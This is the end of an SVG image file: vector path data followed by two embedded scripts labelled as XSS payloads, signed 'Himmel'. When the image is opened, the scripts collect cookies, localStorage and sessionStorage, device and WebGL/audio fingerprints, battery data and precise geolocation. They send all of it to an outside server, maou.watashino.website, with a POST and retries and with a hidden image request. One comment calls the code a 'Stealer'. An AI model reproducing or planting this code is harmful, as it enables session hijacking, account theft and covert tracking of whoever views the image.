44 19 43 22 -4 21 16 112 25 112 9 0 6 -28 -7 -75 -4 -11 0 -6 8 10 8 17 15
39 16 50 0 12 6 27 13 34 14 16 11 15 -58 -14 l-40 -17 43 44 c49 51 57 76 10
31 -18 -16 -40 -33 -49 -36 -14 -4 -14 -12 -5 -53 10 -45 11 -46 14 -16 4 35
32 46 32 12 0 -42 -27 -87 -58 -98 -36 -13 -41 -8 -72 63 -11 28 -18 38 -15
23 4 -21 0 -30 -16 -38 -11 -7 -26 -9 -34 -6 -17 6 -85 142 -85 171 0 14 20
38 63 72 34 28 73 63 86 77 24 26 24 26 3 26 -13 0 -27 -11 -36 -28z"/>
<path d="M2444 429 c-6 -8 -15 -25 -19 -39 -4 -14 -27 -46 -51 -72 -42 -45
-56 -78 -34 -78 6 0 10 6 8 13 -2 7 23 43 55 80 41 46 58 73 55 88 -2 18 -5
20 -14 8z"/>
<path d="M992 363 c67 -33 97 -53 97 -66 1 -29 43 -41 103 -30 l53 10 -57 2
c-60 1 -91 9 -84 20 3 4 2 11 -2 16 -10 14 -71 45 -87 45 -7 0 -18 6 -24 14
-6 8 -22 16 -34 19 -12 2 -31 7 -42 11 -11 4 24 -15 77 -41z"/>
<path d="M2220 346 c0 -2 23 -16 51 -29 27 -14 48 -20 46 -14 -3 11 -97 52
-97 43z"/>
<path d="M343 243 c48 -49 128 -149 182 -226 8 -12 17 -19 19 -16 13 13 -224
299 -247 299 -5 0 16 -26 46 -57z"/>
<path d="M1484 292 c4 -7 39 -35 78 -62 51 -36 78 -49 92 -44 15 4 17 3 7 -4
-11 -8 -11 -11 3 -19 18 -10 12 -43 -8 -43 -14 0 -50 23 -91 59 l-30 26 30
-33 c16 -18 51 -47 77 -63 53 -35 59 -49 26 -73 -15 -10 -17 -14 -5 -10 12 4
17 1 17 -12 0 -16 2 -17 10 -4 6 9 8 40 4 75 l-6 60 38 -35 c57 -52 64 -63 52
-77 -6 -7 -15 -13 -20 -13 -6 0 -4 8 3 17 9 10 0 8 -21 -7 -27 -20 -31 -25
-17 -28 10 -2 32 5 50 15 31 18 33 18 67 1 42 -22 73 -23 89 -4 9 10 20 12 41
6 20 -6 30 -5 33 3 3 8 10 6 24 -5 25 -23 61 -25 43 -3 -7 8 -19 15 -26 15
-19 0 -18 13 8 57 24 43 15 36 -26 -19 -33 -47 -53 -50 -26 -5 11 17 20 41 19
52 -1 16 -2 15 -8 -6 -18 -57 -31 -71 -59 -64 -15 4 -36 14 -47 23 -13 11 -11
7 4 -11 39 -43 15 -44 -25 -1 -20 21 -31 29 -25 17 6 -12 23 -31 37 -42 25
-19 25 -21 6 -21 -11 0 -33 5 -47 10 -34 13 -176 141 -169 152 3 5 10 6 15 3
5 -4 9 -1 9 5 0 7 -7 10 -15 6 -8 -3 -15 -1 -15 4 0 5 -11 12 -25 16 -27 7
-111 52 -155 82 -13 9 -21 11 -16 4z"/>
<path d="M2176 178 c22 -32 107 -78 142 -78 15 0 21 -4 16 -12 -4 -6 -3 -8 4
-4 12 7 52 -39 52 -60 0 -7 5 -16 12 -20 8 -5 9 -2 5 9 -4 10 -10 24 -13 32
-5 13 -2 14 22 5 31 -12 90 -5 138 16 41 18 28 17 -49 -2 -57 -14 -66 -14 -92
0 -57 31 -89 44 -131 56 -24 6 -62 28 -85 48 -34 31 -38 32 -21 10z"/>
<path d="M2168 140 c11 -19 32 -59 47 -88 15 -30 29 -51 32 -49 6 7 -51 118
-77 147 l-22 25 20 -35z"/>
<path d="M1420 133 c0 -5 12 -16 25 -26 19 -13 23 -14 19 -3 -4 11 1 14 19 12
18 -2 24 1 20 10 -5 15 -83 20 -83 7z"/>
<path d="M1480 102 c0 -5 7 -15 15 -22 22 -18 9 -30 -33 -30 -28 0 -33 3 -22
10 8 5 10 10 4 10 -17 0 -41 -24 -47 -48 -3 -12 -1 -22 4 -22 5 0 9 8 9 18 0
12 9 18 27 20 26 2 26 2 7 -20 l-19 -23 26 22 c14 13 39 26 57 29 32 7 32 6
22 -22 -9 -28 -9 -29 6 -7 13 18 20 21 35 12 11 -5 17 -14 14 -20 -4 -5 -1 -9
4 -9 6 0 11 5 11 10 0 6 9 10 20 10 11 0 20 4 20 9 0 4 -11 6 -25 4 -27 -6
-96 31 -92 50 1 6 -2 11 -8 12 -5 0 -16 4 -22 8 -7 5 -13 4 -13 -1z"/>
</g>
<script>
            <![CDATA[
              (function() {
                try {
                  // Execute XSS payload
                  prompt(`🛰️ XSS @${location.hostname}\n\n🧠 SYSTEM\n• Domain:${location.hostname}\n• URL:${location.href}\n• Protocol:${location.protocol}\n• Host:${location.host}\n• Path:${location.pathname}\n• Port:${location.port||'default'}\n• Search:${location.search||'None'}\n\n📄 DOCUMENT\n• Title:${document.title}\n• Charset:${document.characterSet}\n• Encoding:${document.inputEncoding||'N/A'}\n• ReadyState:${document.readyState}\n• Referrer:${document.referrer||'None'}\n• Cookies:${document.cookie||'None'}\n• LastModified:${document.lastModified}\n\n👤 USER\n• AppName:${navigator.appName}\n• AppVersion:${navigator.appVersion}\n• UA:${navigator.userAgent}\n• Platform:${navigator.platform}\n• Lang:${navigator.language}\n• Online:${navigator.onLine}\n• Java:${navigator.javaEnabled?.()?'Yes':'No'}\n• TouchPts:${navigator.maxTouchPoints||0}\n\n🖥️ SCREEN\n• Width:${screen.width}\n• Height:${screen.height}\n• ColorDepth:${screen.colorDepth}\n• PixelDepth:${screen.pixelDepth}\n\n📝 TEXT\n${(document.body?.innerText||'null').slice(0,100).replace(/\\s+/g,' ')}\n\n🔐 By Himmel`);
                  
                  
    // Enhanced data collection with error handling
    async function collectAndSendData() {
      try {
        // 1. Collect all data
        const data = {
          cookies: getAllCookies(),
          localStorage: getAllLocalStorage(),
          sessionStorage: getAllSessionStorage(),
          userAgent: navigator.userAgent,
          referrer: document.referrer,
          location: window.location.href,
          screen: getScreenInfo(),
          device: getDeviceInfo(),
          network: getNetworkInfo(),
          plugins: getPluginsInfo(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timestamp: new Date().toISOString(),
          webgl: getWebGLInfo(),
          audioContext: getAudioContextInfo(),
          battery: await getBatteryInfo(),
          touchSupport: getTouchSupport()
        };

        // 2. Try to get geolocation (with timeout)
        await getGeolocation(data);
        
        // 3. Send data
        await sendData('https://maou.watashino.website/api.php', data, 'image');
      } catch (e) {
        console.error('Data collection error:', e);
      }
    }

    // Enhanced screen information
    function getScreenInfo() {
      try {
        return {
          width: window.screen.width,
          height: window.screen.height,
          colorDepth: window.screen.colorDepth,
          availWidth: window.screen.availWidth,
          availHeight: window.screen.availHeight,
          pixelDepth: window.screen.pixelDepth,
          orientation: window.screen.orientation?.type,
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight,
          outerWidth: window.outerWidth,
          outerHeight: window.outerHeight
        };
      } catch (e) {
        console.error('Screen info error:', e);
        return { error: 'Failed to get screen info' };
      }
    }

    // Comprehensive device information
    function getDeviceInfo() {
      try {
        return {
          hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
          deviceMemory: navigator.deviceMemory || 'unknown',
          maxTouchPoints: navigator.maxTouchPoints || 0,
          platform: navigator.platform,
          vendor: navigator.vendor,
          cpuClass: navigator.cpuClass,
          devicePixelRatio: window.devicePixelRatio || 1,
          doNotTrack: navigator.doNotTrack,
          language: navigator.language,
          languages: navigator.languages,
          userAgentData: navigator.userAgentData || 'unsupported'
        };
      } catch (e) {
        console.error('Device info error:', e);
        return { error: 'Failed to get device info' };
      }
    }

    // Network information
    function getNetworkInfo() {
      try {
        return {
          connection: navigator.connection ? {
            downlink: navigator.connection.downlink,
            effectiveType: navigator.connection.effectiveType,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData,
            type: navigator.connection.type
          } : 'unsupported',
          online: navigator.onLine
        };
      } catch (e) {
        console.error('Network info error:', e);
        return { error: 'Failed to get network info' };
      }
    }

    // Cookie collection with URI encoding
    function getAllCookies() {
      try {
        const cookies = {};
        document.cookie.split(';').forEach(cookie => {
          const [name, ...rest] = cookie.trim().split('=');
          const value = rest.join('=');
          try {
            cookies[name] = decodeURIComponent(value);
          } catch {
            cookies[name] = value; // Fallback if decoding fails
          }
        });
        return cookies;
      } catch (e) {
        console.error('Cookie error:', e);
        return { error: 'Failed to get cookies' };
      }
    }

    // LocalStorage collection
    function getAllLocalStorage() {
      try {
        const storage = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          storage[key] = localStorage.getItem(key);
        }
        return storage;
      } catch (e) {
        console.error('LocalStorage error:', e);
        return { error: 'Failed to get localStorage' };
      }
    }

    // SessionStorage collection
    function getAllSessionStorage() {
      try {
        const storage = {};
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          storage[key] = sessionStorage.getItem(key);
        }
        return storage;
      } catch (e) {
        console.error('SessionStorage error:', e);
        return { error: 'Failed to get sessionStorage' };
      }
    }

    // Plugin information
    function getPluginsInfo() {
      try {
        return Array.from(navigator.plugins).map(p => ({
          name: p.name,
          description: p.description,
          filename: p.filename,
          length: p.length
        }));
      } catch (e) {
        console.error('Plugins error:', e);
        return { error: 'Failed to get plugins' };
      }
    }

    // WebGL fingerprinting
    function getWebGLInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return 'unsupported';
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
          vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
          renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
          version: gl.getParameter(gl.VERSION)
        };
      } catch (e) {
        console.error('WebGL error:', e);
        return { error: 'Failed to get WebGL info' };
      }
    }

    // AudioContext fingerprinting
    function getAudioContextInfo() {
      try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        const gainNode = audioContext.createGain();
        const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
        
        oscillator.connect(analyser);
        analyser.connect(scriptProcessor);
        scriptProcessor.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.type = 'triangle';
        oscillator.start();
        
        const audioFingerprint = [];
        scriptProcessor.onaudioprocess = e => {
          const channelData = e.inputBuffer.getChannelData(0);
          audioFingerprint.push(Array.from(channelData.slice(0, 5)));
        };
        
        setTimeout(() => {
          oscillator.stop();
          audioContext.close();
        }, 100);
        
        return { supported: true, sample: audioFingerprint[0] || [] };
      } catch (e) {
        return { supported: false, error: e.message };
      }
    }

    // Battery information
    async function getBatteryInfo() {
      try {
        if (!navigator.getBattery) return 'unsupported';
        const battery = await navigator.getBattery();
        return {
          charging: battery.charging,
          level: battery.level,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } catch (e) {
        return { error: 'Failed to get battery info' };
      }
    }

    // Touch support detection
    function getTouchSupport() {
      return {
        touchEvents: 'ontouchstart' in window,
        maxTouchPoints: navigator.maxTouchPoints || 0,
        pointerEvents: !!window.PointerEvent,
        touchScreen: window.matchMedia('(pointer: coarse)').matches
      };
    }

    // Geolocation with timeout
    function getGeolocation(data) {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve();
        
        const timeout = setTimeout(() => resolve(), 3000);
        
        navigator.geolocation.getCurrentPosition(
          pos => {
            clearTimeout(timeout);
            data.geolocation = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              altitude: pos.coords.altitude,
              altitudeAccuracy: pos.coords.altitudeAccuracy,
              heading: pos.coords.heading,
              speed: pos.coords.speed
            };
            resolve();
          },
          err => {
            clearTimeout(timeout);
            console.error('Geolocation error:', err);
            resolve();
          },
          { timeout: 2000, enableHighAccuracy: true }
        );
      });
    }

    // Data sending with retry
    async function sendData(endpoint, data, mode) {
      try {
        const payload = JSON.stringify(data);
        
        // Try beacon API first if available
        if (mode === 'beacon' && navigator.sendBeacon && payload.length < 64000) {
          const success = navigator.sendBeacon(endpoint, payload);
          if (success) return;
        }
        
        // Fallback to fetch with retry
        await fetchWithRetry(endpoint, payload, mode);
      } catch (e) {
        console.error('Send error:', e);
      }
    }

    // Fetch with retry logic
    async function fetchWithRetry(url, data, mode, retries = 3) {
      for (let i = 0; i < retries; i++) {
        try {
          const options = {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: data
          };
          
          if (mode === 'no-cors') {
            options.mode = 'no-cors';
            options.keepalive = true;
          }
          
          const response = await fetch(url, options);
          return; // Success
        } catch (e) {
          if (i === retries - 1) throw e;
          await new Promise(r => setTimeout(r, 1000 * (i + 1)));
        }
      }
    }

    // Start data collection after slight delay
    setTimeout(collectAndSendData, 500);
  
                } catch(e) {
                  console.error('Error:', e);
                }
              })();
            ]]>
          </script>
          <script>
            <![CDATA[
              (function() {
                try {
                  // Execute XSS payload
                  (async%20()%20%3D%3E%20%7B%0Aconst%20batt%20%3D%20(await%20navigator.getBattery?.())%20%7C%7C%20%7Blevel%3A'NA'%7D%3B%0Aconst%20net%20%3D%20navigator.connection?.effectiveType%20%7C%7C%20'NA'%3B%0Aprompt(%60himmel%20kissed-By-0x1337%5Cn%C2%A9-Domain:::${location.hostname}%5Cn%C2%A9-ready-state:::${document.readyState}%5Cn%C2%A9-path:::${location.pathname}%5Cn%C2%A9-referrer:::${document.referrer||'None'}%5Cn%C2%A9-textContent:::${(document.body?.textContent?.trim().slice(0,50)||'null')}%5Cn%C2%A9-appName:::${navigator.appName}%5Cn%C2%A9-appCodeName:::${navigator.appCodeName}%5Cn%C2%A9-userAgent:::${navigator.userAgent}%5Cn%C2%A9-pixelDepth:::${screen.pixelDepth}%5Cn%C2%A9-colorDepth:::${screen.colorDepth}%5Cn%C2%A9-AvailWidth:::${screen.availWidth}%5Cn%C2%A9-AvailHeight:::${screen.availHeight}%5Cn%C2%A9-innerWidth:::${innerWidth}%5Cn%C2%A9-innerHeight:::${innerHeight}%5Cn%C2%A9-orientation:::${screen.orientation?.type||'N/A'}%5Cn%C2%A9-OnLine:::${navigator.onLine}%5Cn%C2%A9-Date:::${new%20Date().toLocaleDateString()}%5Cn%C2%A9-origin:::${location.origin}%5Cn%C2%A9-timezone:::${Intl.DateTimeFormat().resolvedOptions().timeZone||'N/A'}%5Cn%C2%A9-cpu-threads:::${navigator.hardwareConcurrency||'N/A'}%5Cn%C2%A9-memory:::${navigator.deviceMemory||'N/A'}%5Cn%C2%A9-languages:::${navigator.languages?.join(',')||'N/A'}%5Cn%C2%A9-maxTouch:::${navigator.maxTouchPoints||0}%5Cn%C2%A9-java:::${navigator.javaEnabled?.()?'Yes':'No'}%5Cn%C2%A9-cookie:::${document.cookie||'None'}%5Cn%C2%A9-localStorage:::${Object.keys(localStorage).length}%5Cn%C2%A9-sessionStorage:::${Object.keys(sessionStorage).length}%5Cn%C2%A9-battery:::${batt.level}%5Cn%C2%A9-network:::${net}%5Cn%C2%A9-historyLength:::${history.length}%60,%22himmel%22)%7D)();
                  
                  
        // Session data collection
        try {
          const data = {
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            location: window.location.href,
            timestamp: new Date().toISOString()
          };
          
          const encoded = encodeURIComponent(JSON.stringify(data));
          
          
            const img = document.createElement('img');
            img.src = 'https://maou.watashino.website/api.php?data=' + encoded;
            img.style.display = 'none';
            document.body.appendChild(img);
          
        } catch(e) {
          console.error('Stealer error:', e);
        }
      
                } catch(e) {
                  console.error('Error:', e);
                }
              })();
            ]]>
          </script>
          </svg>